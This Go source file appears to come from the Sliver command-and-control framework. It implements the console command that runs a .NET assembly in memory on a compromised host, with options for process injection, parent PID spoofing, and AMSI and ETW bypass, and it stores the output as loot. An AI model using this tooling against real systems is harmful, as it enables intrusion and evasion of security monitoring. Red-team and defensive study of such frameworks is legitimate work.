package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"
	"path/filepath"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// ExecuteAssemblyCmd - Execute a .NET assembly in-memory
func ExecuteAssemblyCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	assemblyPath := ctx.Args.String("filepath")
	isDLL := false
	if filepath.Ext(assemblyPath) == ".dll" {
		isDLL = true
	}
	if isDLL {
		if ctx.Flags.String("class") == "" || ctx.Flags.String("method") == "" {
			con.PrintErrorf("Please provide a class name (namespace.class) and method\n")
			return
		}
	}
	assemblyBytes, err := os.ReadFile(assemblyPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}

	assemblyArgs := ctx.Args.StringList("arguments")
	process := ctx.Flags.String("process")
	processArgsStr := ctx.Flags.String("process-arguments")
	processArgs := strings.Split(processArgsStr, " ")
	inProcess := ctx.Flags.Bool("in-process")

	runtime := ctx.Flags.String("runtime")
	etwBypass := ctx.Flags.Bool("etw-bypass")
	amsiBypass := ctx.Flags.Bool("amsi-bypass")

	if !inProcess && (runtime != "" || etwBypass || amsiBypass) {
		con.PrintErrorf("The --runtime, --etw-bypass, and --amsi-bypass flags can only be used with the --in-process flag\n")
		return
	}

	assemblyArgsStr := strings.Join(assemblyArgs, " ")
	assemblyArgsStr = strings.TrimSpace(assemblyArgsStr)
	if len(assemblyArgsStr) > 256 && !inProcess {
		con.PrintWarnf(" Injected .NET assembly arguments are limited to 256 characters when using the default fork/exec model.\nConsider using the --in-process flag to execute the .NET assembly in-process and work around this limitation.\n")
		confirm := false
		prompt := &survey.Confirm{Message: "Do you want to continue?"}
		survey.AskOne(prompt, &confirm, nil)
		if !confirm {
			return
		}
	}

	ctrl := make(chan bool)
	con.SpinUntil("Executing assembly ...", ctrl)
	execAssembly, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:     con.ActiveTarget.Request(ctx),
		IsDLL:       isDLL,
		Process:     process,
		Arguments:   assemblyArgsStr,
		Assembly:    assemblyBytes,
		Arch:        ctx.Flags.String("arch"),
		Method:      ctx.Flags.String("method"),
		ClassName:   ctx.Flags.String("class"),
		AppDomain:   ctx.Flags.String("app-domain"),
		ProcessArgs: processArgs,
		PPid:        uint32(ctx.Flags.Uint("ppid")),
		Runtime:     runtime,
		EtwBypass:   etwBypass,
		AmsiBypass:  amsiBypass,
		InProcess:   inProcess,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}
	hostName := getHostname(session, beacon)
	if execAssembly.Response != nil && execAssembly.Response.Async {
		con.AddBeaconCallback(execAssembly.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, execAssembly)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}

			HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, ctx, con)
		})
		con.PrintAsyncResponse(execAssembly.Response)
	} else {
		HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, ctx, con)
	}
}

func HandleExecuteAssemblyResponse(execAssembly *sliverpb.ExecuteAssembly, assemblyPath string, hostName string, ctx *grumble.Context, con *console.SliverConsoleClient) {
	saveLoot := ctx.Flags.Bool("loot")
	lootName := ctx.Flags.String("name")

	if execAssembly.GetResponse().GetErr() != "" {
		con.PrintErrorf("Error: %s\n", execAssembly.GetResponse().GetErr())
		return
	}

	PrintExecutionOutput(string(execAssembly.GetOutput()), ctx.Flags.Bool("save"), ctx.Command.Name, hostName, con)

	if saveLoot {
		LootExecute(execAssembly.GetOutput(), lootName, ctx.Command.Name, assemblyPath, hostName, con)
	}
}
